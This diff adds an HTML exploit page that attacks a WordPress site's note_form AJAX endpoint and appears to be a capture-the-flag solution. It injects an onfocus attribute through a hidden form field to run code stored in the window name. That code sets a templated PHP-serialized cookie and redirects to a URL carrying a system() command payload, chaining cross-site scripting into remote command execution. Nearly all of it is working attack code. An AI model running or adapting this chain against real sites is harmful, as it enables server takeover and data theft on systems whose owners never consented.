@@ -1,0 +1,35 @@
+<html>
+    <head>
+    </head>
+    <body>
+        <form method="post">
+            <input type="hidden" name="now" value='" autofocus=1 name=noteTime onfocus=eval(window.name)//'>
+        </form>
+
+        <script>
+            const sleep = (s) => new Promise((resolve) => setTimeout(resolve, s))
+            const TARGET = "http://wordpress"
+            const myform = document.querySelector("form")
+            for (let i=0;i<1000;i++){
+                const input = document.createElement('input')
+                input.name='a'
+                input.value=''
+                myform.appendChild(input)
+            }
+            myform.action = TARGET + "/wp-admin/admin-ajax.php/'type=?action=note_form"
+            function setcookie() {
+                // php serialize.php
+                // because there's a limit size in cookie value, we can't exploit it using php filter chain
+                // and we can't exploit it using pearcmd because it's in client side, the browser will encode ' and "
+                document.cookie = "notes={{cookie|safe}}"
+                // php gen.php
+                document.location = "/wp-admin/admin-ajax.php/?action=note_form" + "&+--cmd+-r=system({{xor_payload|safe}});"
+            }
+            myform.target = `(${setcookie})()`;
+            (async () => {
+                const w = open("/", myform.target)
+                myform.submit()
+            })()
+        </script>
+    </body>
+</html>
